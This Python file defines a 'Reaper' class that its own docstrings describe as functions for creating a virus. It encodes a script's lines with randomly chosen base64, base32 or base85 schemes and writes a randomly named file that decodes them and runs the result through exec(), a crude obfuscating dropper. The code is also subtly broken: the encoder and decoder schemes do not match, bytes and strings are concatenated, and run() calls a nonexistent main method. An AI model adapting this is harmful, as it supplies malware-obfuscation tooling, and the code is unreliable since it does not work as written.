import os
import base64
import random
import string
import hashlib
import struct
import socket


class Reaper:
    """
    Reaper is a class that contains all the functions needed to create a virus.

    Attributes
    ----------
    random_char : function
        Returns a random string of characters.
    encrypt : function
        Encrypts the virus.
    write_lines : function
        Writes the encrypted virus to a file.
    decrypt : function
        Decrypts the virus.
    main : function
        Runs the virus.

    Methods
    -------
    random_char(y)
        Returns a random string of characters.
    encrypt(lines)
        Encrypts the virus.
    write_lines(lines, virus)
        Writes the encrypted virus to a file.
    decrypt(lines, opt)
        Decrypts the virus.
    run(file, name)
        Runs the virus.

    Usage:
    ------
    >>> from reaper.main import Reaper
    >>> virus = Reaper()
    >>> virus.run('virus.py', 'main')

    Usage2:

    # Create a Reaper object
    reaper = Reaper()

    # Encrypt some lines of text
    lines = ["This is a secret message", "This is another secret message"]
    encrypted_lines, encryption_method = reaper.encrypt(lines)

    # Write the encrypted lines to a file
    with open("encrypted_file.txt", "w") as f:
        f.writelines(encrypted_lines)

    # Decrypt the lines and print them
    with open("encrypted_file.txt", "r") as f:
        lines = f.readlines()
        decrypted_lines = reaper.decrypt(lines, encryption_method)
        print(decrypted_lines)
    """

    def random_char(self, y):
        """Returns a random string of characters."""
        return ''.join(random.choice(string.ascii_letters) for _ in range(y))

    def encrypt(self, lines):
        """Encrypts the virus."""
        enc, i = [], random.randint(1, 4)
        for line in lines:
            if i == 1:
                enc.append(base64.b64encode(line) + '\n')
            elif i == 2:
                enc.append(base64.b32encode(line) + '\n')
            elif i == 3:
                enc.append(base64.b64encode(line) + '\n')
            elif i == 4:
                enc.append(base64.b85encode(line) + '\n')
        return enc, i

    def write_lines(self, lines, virus):
        """Writes the encrypted virus to a file."""
        with open(virus, 'a') as op:
            op.write('strings = """')
            op.writelines(lines)
            op.write('"""')

    def decrypt(self, lines, opt):
        """Decrypts the virus."""
        virus = self.random_char(random.randint(3, 8))
        with open(virus, 'w') as op:
            op.write("#!/usr/bin/python\nimport os, base64\n\noption = " + str(opt) + "\n")
        self.write_lines(lines, virus)
        with open(virus, 'a') as op:
            op.writelines("""
                strings = strings.split('\n')
                code = []
                for string in strings:
                    if option == 1:
                        code.append(base64.b16decode(string))
                    elif option == 2:
                        code.append(base64.b32decode(string))
                    elif option == 3:
                        code.append(base64.b64decode(string))
                    elif option == 4:
                        code.append(base64.b85decode(string))
                exec(''.join(code))
                """
            )

    def run(self, file, name):
        """Runs the virus."""
        with open(file, 'r') as ip:
            lines = [line for line in ip]
        code, opt = self.encrypt(lines)
        self.decrypt(code, opt)
        if name == "main":
            self.main()